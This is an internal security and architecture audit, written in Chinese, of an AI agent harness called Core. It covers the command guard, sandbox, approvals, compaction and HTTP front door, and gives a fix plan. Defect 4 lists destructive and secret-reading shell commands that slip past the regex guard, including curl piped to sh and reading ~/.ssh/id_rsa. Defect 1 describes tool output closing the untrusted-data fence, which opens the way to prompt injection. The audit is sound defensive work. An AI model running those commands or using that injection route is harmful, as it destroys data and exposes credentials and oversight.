# Core 架构审计（2026-10-14）

起因：用户指出 Core 是用较弱的模型写的，摘要、审批、沙箱、守卫像“随手写的”，架构也可能有大问题，要求先把子系统读完，再谈要改的点，并对照 Codex、deepseek-harness（dsh）、Hermes、Pi。同一天用户要求直连路由经 Core 开放 bash，本文也回答这件事现在能不能做。

这份文档只写**读到的代码和跑出来的结果**，以及据此拟定的方案。**没有改任何产品代码。** 没读到的地方明确写“未读”。

## 1. 结论

1. **基础是好的，但质量不均匀。** 分层干净，外部 IO 适配器很讲究，持久化基本是原子写，子代理和流水线的设计合理。薄弱处集中在“安全判定”和“上下文”两块，外加几个大文件和散落的配置。
2. **“整体架构烂掉”这个判断，证据不支持；“安全守卫、审批、摘要是玩具”基本成立。** 两者要分开看。
3. **审计中跑出了 3 个已复现的缺陷**（第 3 节），都在“每次工具调用都经过”的公共路径上，改动小、收益大。
4. **bash 暂时不开放。** 理由和前置条件见第 6 节；其中一条是新发现：Core 现成的 `executeBash` 不经过沙箱包装，也不清理环境变量。

## 2. 覆盖范围

| 状态 | 范围 |
|---|---|
| 读完 | `agent/internal/{context,permission-control,session-registry,session-state,auto-summary,event-log}`、`agent/sessions/service`、`agent/store`、`agent/security/*`（守卫、沙箱、权限、脱敏、场景预设、隔离报告、流超时）、`agent/policy`、`agent/tools/{wrapped-tool,mcp-tools,model-output-limit,research-budget}`、`agent/goals/*`、`agent/subagents/{profiles,catalog,execution}`、`agent/extensions/skills`、`agent/schedules`、`delivery/http/{security,handler,bind,serve,router,json,parsing/errors}`、`adapters/mcp/connection`、`adapters/service-api/openapi`（请求构造部分） |
| 读了一部分 | `agent/control/service`（结构加关键段）、`adapters/pi/{runtime,session/wrap-session,session/open-session}`、`adapters/google/antigravity*`（头部）、`app/bootstrap`（头部）、`agent/pipeline/job-runner`（头部）、`agent/diagnosis`（头部加规则表）、`agent/artifacts/store`（头部）、`delivery/http/protocol/sse`（结构）、`adapters/docker`（头部） |
| 未读 | `agent/activity`、`agent/capabilities` 的各契约细节（只看了结构）、`adapters/{navidrome,arcane,openlist,jellyfin,emby,immich,qbittorrent,jev}` 的细节、`delivery/http/routes/*` 的逐个路由、`delivery/{tui,cli}`、`testing/` |

代码约 4.6 万行（不含测试）：未读部分以适配器细节和 TUI/CLI 为主，不影响安全与上下文方面的结论，但我不对它们的质量下结论。

## 3. 已复现的缺陷

复现脚本在 `docs/audit-probes/`，在 `core/` 下运行 `node --experimental-strip-types docs/audit-probes/<文件>.mts`。

| # | 缺陷 | 复现结果 |
|---|---|---|
| 1 | **工具结果可以关闭“不可信数据”围栏。** `wrapCustomTools` 把结果拼进 `<tool_output tool="x">…</tool_output>`，没有处理内容里的 `</tool_output>`。 | 内容含 `</tool_output>` 时，输出里出现 2 个闭合标签（应为 1）。网页、日志、MCP 返回的文本都可以借此把后面的文字伪装成围栏之外的指令。 |
| 2 | **看门狗超时后工具继续运行。** 超时只让 `Promise.race` 拒绝，没有中止工具。 | `toolWatchdogMs=50` 时模型 50 毫秒后就得到“超时”，工具却跑完了 300 毫秒，全程没收到中止信号。写操作超时后还会继续执行，结果和审计都不再记录。 |
| 3 | **工具调用预算被别的会话重置。** 策略引擎每个 Agent 只有一份运行状态，任何会话开始一次提问都会 `beginRun()`。 | 会话 A 已用 2 次，会话 B 开始提问后 A 的计数变成 0。并发的会话、目标、子代理共用并互相重置预算和锁存状态。 |
| 4 | **命令守卫对常见写法放行。**（`docs/audit-probes/command-guard.mts`） | 判为“safe/allowed”的：`rm -rf "$HOME"`、`rm -rf $HOME`、`cd / && rm -rf *`、`find / -delete`、`sh -c 'rm -rf /'`、`eval "rm -rf /"`、`rm -r -f /`、`rm --recursive --force /`、`curl http://x | sh`、`cat ~/.ssh/id_rsa`；`chmod -R 777 /` 只判“caution”。判为 critical 的只有字面形式，如 `rm -rf /`、`\rm -rf /`、`/bin/rm -rf /`。 |

另有两条是读代码得出、**尚未写脚本复现**的：

- `eventLog.lastEvents` 是 Agent 全局缓冲区，每次提问清空，`promptResult` 返回它；并发会话时事件会串到别的提问结果里。
- `session.executeBash` 不经过沙箱包装（第 6 节）。

## 4. 分子系统评价

### 4.1 好的部分（要保留）

- **分层**：`agent` 不引用 `adapters`/`delivery`，`adapters` 不引用 `delivery`；`as any` 1 处，`@ts-ignore` 0，TODO 0。
- **服务 API 适配器**（`adapters/service-api/openapi.ts`）：路径校验（拒绝 `//`、`\`、`#`、编码斜杠、`.`/`..`、二次解码）、每次 `redirect:"error"`、认证头只发同源、响应体有上限、有超时、规格文档当不可信数据、操作默认要审批。**安全核心应当达到这个水准。**
- **持久化**：会话元数据、产物、活动、能力运行、调度、提供商配置都是临时文件加 `rename` 的原子写。
- **子代理管理器**：一次性临时会话、全局和每个父会话的并发上限、排队、重启后标记为中断、子代理的权限请求转给父会话、`finally` 里释放、按 `maxTurns` 中止。
- **目标执行**：工作者和复核者是两个独立子代理；运行中的目标重启后恢复为暂停。
- **流水线**：确定性的持久化状态机，重试次数有界，“模型选一次，后面机器跑”。
- **记住的权限**（`remembered-permissions.ts`）：高风险工具按参数哈希记住，一个 `ls` 的允许不能授权 `rm -rf`；更窄的拒绝优先。
- **隔离报告**（`isolation.ts`）：明说“请求的沙箱不可用时命令会裸跑”，gondolin 则失败关闭。作者知道 bwrap/docker/seatbelt 是失败开放的，选择了报告而不是阻止。
- **沙箱命令的构造**：参数先组数组再转义，bwrap 用 `--unshare-all`、`--cap-drop ALL`、只读宿主、仅工作区可写；docker 用 `--read-only`、`--cap-drop ALL`、`no-new-privileges`、`--network none`、按调用者 uid:gid 运行。**此前我说它“拼字符串像玩具”，这一点说错了，更正。** 它的问题是下面的默认值和失败方式，不是构造。

### 4.2 薄弱的部分

**命令守卫**（`security/command-risk.ts`，757 行）：46 条对整条命令字符串匹配的正则。不解析 shell，不规范化参数顺序和长短选项，不展开 `sh -c`、`eval`、`$(…)`、变量。见缺陷 4。参考：Codex 有独立的 `execpolicy`（`prefix_rule(pattern, decision=allow|prompt|forbidden, justification, match, not_match)`，示例在加载时校验）加 `shell-command` 解析；Hermes 把 hardline（绝不放行）和 dangerous（要问）分开，另有用户自定义 deny 规则、永久允许名单和连续拒绝熔断。

**沙箱**：默认 `off`；bwrap/docker/seatbelt 在本机不可用时退回裸命令，只给警告（失败开放）；沙箱内整个宿主文件系统可读（`--ro-bind / /`、seatbelt `allow file-read*`），Core 自己的配置和令牌文件也在其中；工具结果不带“沙箱是否生效、是否被拒”的事实。参考：dsh 默认 `read-only`，模式按会话切换并写进会话日志，所有受限能力共用一个策略，拒绝作为结果事实返回，模型可带升级请求重试。

**审批**：至少五套并存、互不共享决策记录：Pi 会话钩子加权限请求；`POST /v1/action` 设备端审批加回执（目前只做容器重启）；`service_api` 的两阶段预览加一次性令牌；能力 HTTP 入口统一返回 403；`fullAccess` 预设加记住的权限。`permission-control` 里的 `preflight()` 与 `request()` 对同一个决定各算一遍，顺序略有不同。审批模式（`ask|read-only|full-access`）是 Agent 全局的。场景预设（`nas-strict` 等 4 个）是对的思路，但只靠环境变量、整个进程一个，不和审批模式联动。参考：dsh 把“沙箱模式”和“审批策略”做成两个正交设置，再用命名预设捆绑；Codex 的 approval × sandbox 也是两个维度。

**摘要与压缩**：Core 自己的 `auto-summary`（192 行）只是空闲后取最近最多 6 万字符转写做一次性摘要，不进入对话。真正的上下文压缩交给 Pi（`autoCompact` 开关），Core 控制不了阈值、保留量、工具结果修剪，没有溢出恢复。`sessions.compact()` 不返回结果。`setAutoCompactionEnabled(sessionId, …)` 名义上按会话，实际改的是 Agent 全局。参考：dsh `compaction-basic`（阈值比例默认 0.8、保留比例 0.16、可按模型配置、压缩前先把超大工具结果裁成头 4096 + 省略标记 + 尾 1024、溢出后自动恢复）；Codex `core/src/compact.rs`（916 行加远程、token 预算等变体，压缩有前后钩子）；Hermes 用小的辅助模型总结中段，头尾保护，迭代式摘要。

**目标的“独立验证”**（`goals/runner.ts`）：验证者子代理必须输出 `VERDICT: pass` 和 `EVIDENCE: …`，Core 用正则接受它；每条完成标准只要验证者输出里出现其中任一个长于 3 个字符的词就算“满足”。没有任何东西真正去执行检查。“只读复核者”的工具表里有 `bash`，“不改文件”只是提示词。

**共享的可变状态**：见缺陷 3 和 `lastEvents`；`registry.active`/`registry.requestStop` 是全局的“当前会话”，是单会话时代的残留；`nonInteractiveRuns` 在 `session-state.ts` 和 `permission-control.ts` 各有一份，前者是死代码。

**脱敏**（`redaction.ts`）：3 条密钥正则加一条环境变量式规则。会误伤任何 40 位十六进制（包括 git 哈希）和含 KEY/PASS 的字段名；不覆盖 JWT、AWS/GitHub 令牌形态、PEM 私钥块、`user:pass@` URL、Cookie。

**HTTP 前门**：
- 一个共享令牌，用 `!==` 比较（非常量时间），没有作用域，所以同一个令牌能读审计、改设置、批准权限、通过会话跑任何工具；没有限速；明文 HTTP。
- `readJson` 吞掉解析错误并返回 `{}`：畸形 JSON 被当成空请求体，而不是 400。（更正：请求体大小上限 `MAX_HTTP_BODY_BYTES` 在 `listen.ts` 里已有，超限返回 413，此前我说“没有”是说错了。）
- `agentError` 在没有状态码时用对消息文本的正则（`/unknown|no session|not found|…/`）决定 404，例如 “unknown model” 变 404。
- Host/Origin 检查只对写方法生效；内网地址和 `.local`/`.ts.net` 不用列入白名单。
- 路由是约 20 个模块按固定顺序逐个试；2470 行的 `openapi.ts` 手写，与路由实现靠人工保持一致。

**配置**：69 个 `THEBE_*` 变量，78 处 `process.env` 读取（`agent` 13、`adapters` 31、`delivery` 14、`app` 20），没有统一的校验和拼写检查；`agent` 核心层也直接读环境变量，与 AGENTS.md 中“`src/app` 是唯一的接线层”不符。

**大文件与重复**：`agent/internal/context.ts` 995 行（设置解析、权限预检、工具装配、会话选项、提问编排、70 行系统提示都在一个闭包里；`sessionOptions` 有 8 个位置参数；“会话正在流式输出”的 409 检查写了 3 遍）；`agent/control/service.ts` 930 行，`invokeCapability` 按能力 id 硬编码分支；`delivery/http/protocol/sse.ts` 里 4 个几乎相同的流函数各自复制常量和测试用重置钩子；三个手写的 frontmatter 解析器（技能、子代理、MCP）；同一段“文件输出规则”提示在系统提示、目标提示、验证提示、4 个子代理档案里各抄一份。

**吞掉的错误**：22 个空 `catch {}`，42 个只有注释的 `catch`；64 处 fire-and-forget 的 `void`；`AgentStore.list()` 每次读取全部会话文件，任何一个文件损坏都会让整个列表失败。

**其他**：`adapters/google` 约 1800 行，用别的产品（Antigravity / Gemini CLI）的公开 OAuth 客户端 ID 并发送其客户端头，因为 Pi 删掉了内置条目。这是账号/条款风险。**2026-10-14 已按用户决定整体移除**（含 `THEBE_ANTIGRAVITY_ENDPOINT` 等环境变量和文档章节）。

### 4.3 这次顺手发现、不属于上面分类的

- `session.executeBash` 不经过 `spawnHook`：`open-session.ts` 给 bash **工具**挂了 `wrapCommandForSandbox` 和 `sanitizeBashEnv`，但 `wrap-session.ts` 的 `executeBash` 只传了 `operations`。结果是它不套 bwrap/docker/seatbelt，也不清理环境变量（Core 进程的令牌等都在其中）；会话没有 `executeBash` 时返回 `{exitCode: 0, output: ""}`，把失败伪装成成功。
- 工具名表（`isHighRiskTool`、`permissionRisk`、`TOOLS_REQUIRING_APPROVAL`、`toolsRequiringApproval` 组装）散在四处，各自硬编码工具名。
- 子代理档案可以由工作区里的 markdown 定义（`.thebe/agents`），其中可写 `tools` 和 `allowWrites: true`——工作区文件能授予能力。
- 本次我自己的两处也属于此类，应一并改：把“权限”放在会话标签里（`thebe.webSearch`）；标签更新是整表替换，部分更新会丢其他标签。

## 5. 方案（拟定，未开始）

分两层。**第一层是小而安全的修补**，不改架构，可以马上做、各自一个提交、各带回归测试。**第二层是重做**，要先定设计。

### 第一层：已复现缺陷的修补

1. 围栏：对工具名和内容里的围栏标记做转义或换成不可预测的随机边界，并为它加回归测试（缺陷 1）。
2. 看门狗：超时时中止传给工具的信号并记一条“超时”审计，工具返回后丢弃结果（缺陷 2）。
3. 预算：运行状态按会话（或按一次提问）持有，不再是 Agent 全局；`lastEvents` 改为按会话取（缺陷 3 及其同类）。
4. `executeBash`：要么补上沙箱和环境清理，要么在没有沙箱时明确失败；不要返回假的成功。
5. `readJson`：畸形 JSON 返回 400；令牌用常量时间比较；`agentError` 不再用消息正则决定状态（已做，见下“进展”）。
6. 清理死代码（第二份 `nonInteractiveRuns`）和 3 份重复的 409 检查。

### 第二层：重做（顺序有依赖）

1. **权限模型**先写决策记录，再写代码：沙箱模式 × 审批策略两个正交设置，加命名预设；每会话可切换并记入会话日志；`fullAccess` 变成其中一个预设；场景预设与审批模式合并。
2. **命令守卫**：先做 shell 解析，再引入 Codex 风格的前缀规则（allow / prompt / forbidden，带说明与示例自检）；现有 46 条正则降为 hardline 层。
3. **沙箱**：失败关闭；默认值由权限模型的预设决定；结果带 `sandbox:{mode, denied}`；宿主可读范围收窄（至少排除 Core 自己的配置目录）。
4. **审批合一**：一个审批服务、一种决策记录，会话内、设备端、两阶段令牌只是三种“回答方”；`preflight`/`request` 合并为一个函数。
5. **上下文**：把“压缩”和“会话回顾”拆成两个概念；压缩参数、压缩前的工具结果修剪、溢出恢复；先确认 Pi 能暴露多少，不够的在 Core 一侧补。回顾可以保留现在的空闲后摘要，但要说清它不是压缩，并让 App 能拿到结果。
6. **目标验证**：让验证真正执行（运行约定的检查命令并读取退出码），而不是解析复核者的文字。
7. **配置**：集中到 `app` 一层，一份带校验的配置模式，未知变量报警，其余层只接收已解析的值。
8. **拆分**：`invokeCapability` 改为能力注册表（能力自带调用方式与审批要求）；`context.ts` 按职责拆；SSE 四个流函数合一；三个 frontmatter 解析器合一。

## 6. 直连路由开放 bash

用户已决定要开放。我读完了能复用的零件，**没有写实现**，原因：

- 守卫是正则（缺陷 4），沙箱默认关且失败开放，审批已有五套，再加一套就是第六套。
- Core 现成的 `agent.executeBash(sessionId, command)`（Pi 的“用户亲手输入的 `!命令`”）看起来最贴合“设备端审批”，**但它不经过沙箱包装和环境清理**（4.3），不能直接拿来用。
- 在这样的基础上开一个能从网络调用的“执行命令”入口，等于把弱点暴露给任何持有令牌的客户端（令牌没有作用域）。

**可选路径：**

- **A（推荐）**：先做第一层的 1、4、5（围栏、`executeBash` 修补、前门），再做第二层的 1–3 的最小切片（权限模型、守卫解析加规则、沙箱失败关闭），然后在其上开 `POST /v1/shell/exec`：App 逐次审批并显示完整命令，Core 先做规则判定，危险的直接拒绝，结果带沙箱事实，全部进审计。
- **B（过渡）**：只做第一层的 `executeBash` 修补和前门，然后立即开 `shell/exec`，**默认关闭**（`THEBE_SHELL_EXEC=on`），沙箱不可用就拒绝执行，critical 和 dangerous 一律拒绝，App 每次审批。等第二层完成后再放宽。

## 7. 需要你决定

1. bash 走 A 还是 B。
2. 第一层的修补可以现在开始吗？（每项一个提交、带测试，不动架构。）
3. `adapters/google`：已决定移除并已完成。
4. 第二层的顺序是否同意：权限模型 → 守卫 → 沙箱 → 审批合一 → 上下文 → 目标验证 → 配置 → 拆分。

## 8. 参考位置

| 内容 | 位置 |
|---|---|
| Codex 命令策略 | `~/Documents/Code/learn/codex/codex-rs/execpolicy/README.md` |
| Codex 命令解析与安全 | `codex-rs/shell-command/src/{bash.rs,parse_command.rs,command_safety/}`、`codex-rs/core/src/safety.rs` |
| Codex 沙箱 | `codex-rs/{linux-sandbox,sandboxing,windows-sandbox-rs,network-proxy}` |
| Codex 压缩 | `codex-rs/core/src/compact*.rs` |
| dsh 沙箱策略、受限 bash | `~/Documents/Code/learn/deepseek-harness/packages/sandbox/sandbox-policy`、`packages/shell/bash-sandbox` |
| dsh 审批与预设 | `packages/interaction/{user-approval,permission-presets}` |
| dsh 压缩 | `packages/compaction/{compaction-basic,compaction-tool-result-pruner,command-compact}` |
| Hermes 审批 | `~/Documents/Code/learn/hermes-agent/tools/approval*.py` |
| Hermes 压缩 | `agent/context_compressor*.py`、`agent/conversation_compression*.py` |

我对参考项目只读了 README、目录结构和少量入口代码，上面的对照是据此写的，动手前要读它们的实现再确认细节。

## 9. 进展（2026-10-14，第一层修补）

| 项 | 状态 | 提交主题 |
|---|---|---|
| 移除 `adapters/google` | 已做 | core: remove the Google Antigravity provider |
| 围栏被数据突破（缺陷 1） | 已做，带测试 | core: keep tool output from closing the untrusted-data fence |
| 看门狗不中止工具（缺陷 2） | 已做，带测试 | core: abort a tool that outlives the watchdog |
| 预算和事件跨会话串扰（缺陷 3 及 `lastEvents`） | 已做，带测试（事件串扰的测试在旧行为下确实失败） | core: stop concurrent sessions from sharing run state |
| `executeBash` 绕过沙箱与环境清理 | 已做，带测试（旧接线下确实泄漏环境变量） | core: run direct bash through the sandbox wrapper and env filter |
| 前门：畸形 JSON 返回 400、令牌常量时间比较、错误状态不再靠消息猜测 | 已做，带测试 | core: harden the HTTP front door |
| 死代码和重复的 409 检查 | 未做 | |
| 命令守卫（缺陷 4） | 未做，属第二层 | |

`executeBash` 现在与 bash 工具一样套沙箱包装，但沙箱不可用时仍是失败开放，等第二层“沙箱失败关闭”一起改。
